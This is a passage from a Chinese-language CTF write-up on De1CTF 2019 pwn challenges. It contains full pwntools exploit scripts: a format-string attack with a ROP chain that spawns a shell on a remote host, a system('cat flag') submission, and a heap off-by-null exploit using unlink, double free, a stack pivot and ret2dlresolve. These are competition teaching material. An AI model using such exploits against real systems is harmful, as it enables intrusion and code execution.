class="line"><span class="comment">#     p.send("%163c%75$hhn%"+str((ad&amp;0xffff)-163)+"c%19$hn")</span></span><br><span class="line"><span class="comment">#     time.sleep(5)</span></span><br><span class="line"><span class="comment">#     p.send("%163c%75$hhn%"+str((value&amp;0xffff)-163)+"c%20$hn")</span></span><br><span class="line"><span class="comment">#     ad=ad+4</span></span><br><span class="line"><span class="comment">#     value=value&gt;&gt;8</span></span><br><span class="line"><span class="comment">#     time.sleep(5)</span></span><br><span class="line"><span class="comment">#     p.send("%163c%75$hhn%"+str((ad&amp;0xffff)-163)+"c%19$hn")</span></span><br><span class="line"><span class="comment">#     time.sleep(5)</span></span><br><span class="line"><span class="comment">#     p.send("%163c%75$hhn%"+str((value&amp;0xffff)-163)+"c%20$hn")</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">  p=remote(<span class="string">"45.32.120.212"</span>,<span class="number">9999</span>)</span><br><span class="line">  p.recvuntil(<span class="string">"gift: "</span>)</span><br><span class="line">  addr=int(p.recvuntil(<span class="string">"\n"</span>),<span class="number">16</span>)</span><br><span class="line">  <span class="keyword">print</span> hex(addr)</span><br><span class="line">  <span class="keyword">if</span> addr&amp;<span class="number">0xffff</span>&lt;<span class="number">0x2000</span>:</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#time.sleep(20)</span></span><br><span class="line">    stack1=addr<span class="number">-0x7fffffffdd90</span>+<span class="number">0x7fffffffdc58</span></span><br><span class="line">    <span class="keyword">print</span> hex(stack1)</span><br><span class="line">    payload=<span class="string">"%712c%26$naaaaaa"</span></span><br><span class="line">    payload+=(<span class="string">"%"</span>+str((stack1&amp;<span class="number">0xffff</span>)<span class="number">-718</span>)+<span class="string">"c%11$hn"</span>).ljust(<span class="number">48</span>,<span class="string">"a"</span>)+p64(<span class="number">0x0400726</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    ad=stack1+<span class="number">8</span></span><br><span class="line">    <span class="keyword">print</span> hex(ad)</span><br><span class="line">    value=<span class="number">0x6011b0</span></span><br><span class="line">    p.sendline(<span class="string">"%163c%75$hhn%"</span>+str((ad&amp;<span class="number">0xffff</span>)<span class="number">-163</span>)+<span class="string">"c%21$hn"</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    p.sendline(<span class="string">"%163c%75$hhn%"</span>+str((value&amp;<span class="number">0xffff</span>)<span class="number">-163</span>)+<span class="string">"c%16$hn"</span>)</span><br><span class="line">    ad=ad+<span class="number">2</span></span><br><span class="line">    value=value&gt;&gt;<span class="number">8</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    p.sendline(<span class="string">"%163c%75$hhn%"</span>+str((ad&amp;<span class="number">0xffff</span>)<span class="number">-163</span>)+<span class="string">"c%21$hn"</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    p.sendline(<span class="string">"%96c%16$hn%67c%75$hhn"</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    rop=p64(<span class="number">0x400833</span>)+p64(<span class="number">0x6011f0</span>)+p64(<span class="number">0x0400831</span>)+p64(<span class="number">0x601060</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4005F0</span>)</span><br><span class="line">    rop+=p64(<span class="number">0x400833</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x0400831</span>)+p64(<span class="number">0x601160</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x400610</span>)</span><br><span class="line">    rop+=p64(<span class="number">0x400833</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x0400831</span>)+p64(<span class="number">0x601060</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x400610</span>)</span><br><span class="line">    rop+=p64(<span class="number">0x400833</span>)+p64(<span class="number">0x601060</span>)+p64(<span class="number">0x40082A</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(<span class="number">0x601168</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x601060</span>)+p64(<span class="number">0x400810</span>)</span><br><span class="line">    p.sendline(<span class="string">"%2093c%75$hn\x00"</span>.ljust(<span class="number">0x150</span>,<span class="string">"a"</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+rop)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    p.send(<span class="string">"a"</span>*<span class="number">8</span>+<span class="string">"\xac"</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.send(<span class="string">"/bin/sh"</span>.ljust(<span class="number">0x3b</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line">    exit()</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    p.close()</span><br><span class="line"><span class="comment">#cat flag &gt;&amp;0</span></span><br></pre></td></tr></table></figure>
<h2 id="0x03-A-B-Judge"><a href="#0x03-A-B-Judge" class="headerlink" title="0x03  A+B Judge"></a>0x03  A+B Judge</h2><p>感觉应该很多人都是非预期<br>提交程序编译运行会直接输出结果，所以直接system(“cat flag”)即可</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Mimic-note"><a href="#0x04-Mimic-note" class="headerlink" title="0x04  Mimic_note"></a>0x04  Mimic_note</h2><h3 id="Analyze-2"><a href="#Analyze-2" class="headerlink" title="Analyze"></a>Analyze</h3><p>二血，happy<br>做完的时候才发现更新了附件给了远程的server<br>不过用处不大，同时给32和64位文件很明显是两个程序输入输出需要相同<br>这时候首先确定不能leak，不然32和64位一定有区别<br>所以首先确定思路是需要构造ret2_dl_runtime_resolve<br>程序本身漏洞在edit:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">char *edit()</span><br><span class="line">&#123;</span><br><span class="line">  char *result; &#x2F;&#x2F; eax</span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+8h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;index ?&quot;);</span><br><span class="line">  v1 &#x3D; get_int();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 15 || !(&amp;notes)[2 * v1] )</span><br><span class="line">    return (char *)puts(&quot;invalid index&quot;);</span><br><span class="line">  puts(&quot;content?&quot;);</span><br><span class="line">  result &#x3D; &amp;(&amp;notes)[2 * v1][read(0, (&amp;notes)[2 * v1], nbytes[2 * v1])];</span><br><span class="line">  *result &#x3D; 0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显存在off by null<br>我选择在32位中get shell<br>因为32位和64位off by null触发时size不同，所以可以保证利用过程中输入输出相同<br>首先常规思路，利用off by null触发unlink操作来造成堆重叠<br>堆重叠后利用double free来分配chunk到notes中(程序没有开启PIE)<br>此时即可修改notes结构体实现任意地址写<br>下面考虑栈迁移：<br>程序GOT表可写，并且发现一个较好的gadget:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080489fb : pop ebp ; ret</span><br></pre></td></tr></table></figure>
<p>要在栈中构造一条ROP链<br>首先栈中数据可控的只有get_int时的输入<br>所以要找到一个函数可以调用时跳入get_int的buf里<br>最后选择delete<br>delete时，在get_int后call free时：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg $esp-0x20</span><br><span class="line">0xffb46d80:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffb46d90:	0x6161616161616161	0x76aa5c00ffb46d0a</span><br><span class="line">0xffb46da0:	0xf7e6eb93080489fb	0x080486bbffb46dc8</span><br><span class="line">0xffb46db0:	0x08048ab700000001	0x0000000100000003</span><br><span class="line">0xffb46dc0:	0x0000000000000001	0x0804896affb46de8</span><br></pre></td></tr></table></figure>
<p>可以看到此时esp与数据块很接近<br>在此之前先将free的got表中地址改为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:08048679                 sub     esp, 0Ch</span><br><span class="line">.text:0804867C                 push    eax             ; size</span><br><span class="line">.text:0804867D                 call    _malloc</span><br></pre></td></tr></table></figure>
<p>因为此处sub     esp, 0Ch，可以使esp落入get_int的buf[0x14],而后push eax，因为call free时eax为需要free的chunk地址，所以事先在对应note处写入一个需要的地址即可在push时打入栈中，这样，我们可控的rop链长度就会为0xc字节，在此前，将malloc的got表地址改为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.init:08048439                 pop     ebx</span><br><span class="line">.init:0804843A                 retn</span><br></pre></td></tr></table></figure>
<p>此时call malloc即可滑入rop链，rop链设置为pop_ebp+fake_stack_addr+leave_ret即可迁移栈段<br>迁移栈段后ret2_dl_runtime_resolve：<br>迁移栈到预先设计好的保存伪造的参数及dynsym和dynstr的位置即可<br>不过有个注意点，这次发现ret2_dl_runtime_resolve时候r_info的数值实际上不能任意，即伪造的dynsym结构所在的地址有要求：<br>在一些地址伪造dynsym结构会在_dl_fixup时crash<br>跟进程序流:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0x804a030 (_GLOBAL_OFFSET_TABLE_+48) — 0x80484e6 (atoi@plt+6) — push   0x48 &#x2F;* &#39;hH&#39; *&#x2F;</span><br><span class="line"> EBX  0x8048288 — dec    esi &#x2F;* &#39;N&#39; *&#x2F;</span><br><span class="line"> ECX  0x0</span><br><span class="line"> EDX  0x8049fc4 (_DYNAMIC+176) — 0x6ffffff0</span><br><span class="line"> EDI  0xf7f89918 — 0x0</span><br><span class="line"> ESI  0xb</span><br><span class="line"> EBP  0x804a030 (_GLOBAL_OFFSET_TABLE_+48) — 0x80484e6 (atoi@plt+6) — push   0x48 &#x2F;* &#39;hH&#39; *&#x2F;</span><br><span class="line"> ESP  0xfff01148 — 0x1</span><br><span class="line"> EIP  0xf7f7384b (_dl_fixup+107) — mov    edx, dword ptr [edx + 4]</span><br><span class="line">──────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────</span><br><span class="line">   0xf7f73835 &lt;_dl_fixup+85&gt;     mov    ebp, eax</span><br><span class="line">   0xf7f73837 &lt;_dl_fixup+87&gt;     jne    _dl_fixup+304 &lt;0xf7f73910&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7f7383d &lt;_dl_fixup+93&gt;     mov    edx, dword ptr [edi + 0xe4]</span><br><span class="line">   0xf7f73843 &lt;_dl_fixup+99&gt;     test   edx, edx</span><br><span class="line">   0xf7f73845 &lt;_dl_fixup+101&gt;    je     _dl_fixup+272 &lt;0xf7f738f0&gt;</span><br><span class="line"> </span><br><span class="line">  0xf7f7384b &lt;_dl_fixup+107&gt;    mov    edx, dword ptr [edx + 4]</span><br><span class="line">   0xf7f7384e &lt;_dl_fixup+110&gt;    movzx  edx, word ptr [edx + esi*2]</span><br><span class="line">   0xf7f73852 &lt;_dl_fixup+114&gt;    and    edx, 0x7fff</span><br><span class="line">   0xf7f73858 &lt;_dl_fixup+120&gt;    shl    edx, 4</span><br><span class="line">   0xf7f7385b &lt;_dl_fixup+123&gt;    add    edx, dword ptr [edi + 0x170]</span><br><span class="line">   0xf7f73861 &lt;_dl_fixup+129&gt;    mov    ecx, dword ptr [edx + 4]</span><br></pre></td></tr></table></figure>
<p>其中有一步会根据r_info&gt;&gt;8来获取距离此处：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-e422cabc650f6013.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="something"><br>偏移处的数值，而后计算出一个地址，并取值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xf7f7385b &lt;_dl_fixup+123&gt;    add    edx, dword ptr [edi + 0x170]</span><br><span class="line">0xf7f73861 &lt;_dl_fixup+129&gt;    mov    ecx, dword ptr [edx + 4]</span><br></pre></td></tr></table></figure>
<p>其实这里只需要计算出的edx地址合法即可<br>但是在伪造dynsym结构体时，在某些地址下伪造可能会导致前面根据esi(r_info)取出的数有问题，导致最后dl_fixup+129处计算出的edx地址非法，所以在伪造dynsym结构时需要选择一个合适的地址（可以多试几次），来使这里edx合法，不造成crash，后面即可正常调用<br>最后get shell时，因为32位和64位输出会不相同，最初想的是反弹shell<br>但是远程报错没有nc和bash命令<br>不过既然存在报错，直接将最后输出转向stderr读取flag即可</p>
<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"size?\n"</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"index ?\n"</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"index ?\n"</span>,str(index))</span><br><span class="line">   <span class="keyword">return</span> p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,note)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"index ?\n"</span>,str(index))</span><br><span class="line">   p.sendafter(<span class="string">"content?\n"</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span><span class="params">()</span>:</span></span><br><span class="line">   stack_addr=<span class="number">0x804a720</span></span><br><span class="line">   rel_plt = <span class="number">0x80483c8</span></span><br><span class="line">   plt_0=<span class="number">0x8048440</span></span><br><span class="line">   index_offset = (stack_addr + <span class="number">28</span>) - rel_plt</span><br><span class="line">   atoi_got = <span class="number">0x804A030</span></span><br><span class="line">   dynsym_addr = <span class="number">0x80481D8</span></span><br><span class="line">   dynstr_addr = <span class="number">0x80482c8</span></span><br><span class="line">   hack_dynsym_addr = stack_addr + <span class="number">36</span></span><br><span class="line">   align = <span class="number">0x10</span> - ((hack_dynsym_addr - dynsym_addr) &amp; <span class="number">0xf</span>)</span><br><span class="line">   hack_dynsym_addr = hack_dynsym_addr + align</span><br><span class="line">   index_dynsym_addr = (hack_dynsym_addr - dynsym_addr) / <span class="number">0x10</span>       </span><br><span class="line">   r_info = (index_dynsym_addr &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">   hack_rel = p32(atoi_got) + p32(r_info)             </span><br><span class="line">   st_name = (hack_dynsym_addr + <span class="number">0x10</span>) - dynstr_addr</span><br><span class="line">   hack_dynsym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">   payload = p32(<span class="number">0</span>)+p32(plt_0)+p32(index_offset)+p32(<span class="number">0</span>)</span><br><span class="line">   payload += p32(stack_addr + <span class="number">80</span>)+p32(<span class="number">0</span>)*<span class="number">2</span>+hack_rel </span><br><span class="line">   payload += <span class="string">'\x00'</span> * align+hack_dynsym +<span class="string">"system\x00"</span></span><br><span class="line">   payload += <span class="string">'\x00'</span>*(<span class="number">80</span>-len(payload))</span><br><span class="line">   payload += <span class="string">"cat flag&gt;&amp;2"</span></span><br><span class="line">   <span class="keyword">return</span> payload</span><br><span class="line"><span class="comment">#p=process("./mimic_note_32")</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p=remote(<span class="string">"45.32.120.212"</span>,<span class="number">6666</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">new(<span class="number">0x84</span>)</span><br><span class="line">new(<span class="number">0x14</span>)</span><br><span class="line">new(<span class="number">0xfc</span>)</span><br><span class="line">new(<span class="number">0x14</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p32(<span class="number">0</span>)*<span class="number">4</span>+p32(<span class="number">0x88</span>+<span class="number">0x18</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0x84</span>)</span><br><span class="line">new(<span class="number">0x14</span>)</span><br><span class="line">new(<span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0x14</span>)</span><br><span class="line">edit(<span class="number">1</span>,p32(<span class="number">0x804a080</span>))</span><br><span class="line">new(<span class="number">0x14</span>)</span><br><span class="line">new(<span class="number">0x14</span>)</span><br><span class="line">new(<span class="number">0x14</span>)</span><br><span class="line">edit(<span class="number">5</span>,p32(<span class="number">0x804A060</span>)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x804a720</span>)+p32(<span class="number">0x1000</span>))</span><br><span class="line">new(<span class="number">0x90</span>)</span><br><span class="line">payload=get_payload()</span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br><span class="line">edit(<span class="number">5</span>,p32(<span class="number">0x804A01C</span>)+p32(<span class="number">0x20</span>))</span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0x08048439</span>)+p32(<span class="number">0x80484a6</span>))</span><br><span class="line">edit(<span class="number">5</span>,p32(<span class="number">0x804A014</span>)+p32(<span class="number">0x10</span>)+p32(<span class="number">0x080489fb</span>)+p32(<span class="number">1</span>))</span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0x8048679</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">magic_code=<span class="string">"1"</span>+<span class="string">" "</span>*<span class="number">15</span>+<span class="string">"\x00"</span>*<span class="number">4</span>+p32(<span class="number">0x804a720</span>)+p32(<span class="number">0x8048924</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">"index ?\n"</span>,magic_code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Weapon"><span class="toc-number">1.</span> <span class="toc-text">0x01 Weapon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Unprintable"><span class="toc-number">2.</span> <span class="toc-text">0x02 Unprintable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-1"><span class="toc-number">2.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-A-B-Judge"><span class="toc-number">3.</span> <span class="toc-text">0x03  A+B Judge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">3.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Mimic-note"><span class="toc-number">4.</span> <span class="toc-text">0x04  Mimic_note</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-2"><span class="toc-number">4.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-3"><span class="toc-number">4.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&text=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&title=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&is_video=false&description=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=De1CTF 2019  PWN&body=Check out this article: http://yoursite.com/2019/08/06/De1CTF-2019-PWN/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&title=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&title=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&title=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&title=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&name=De1CTF 2019  PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


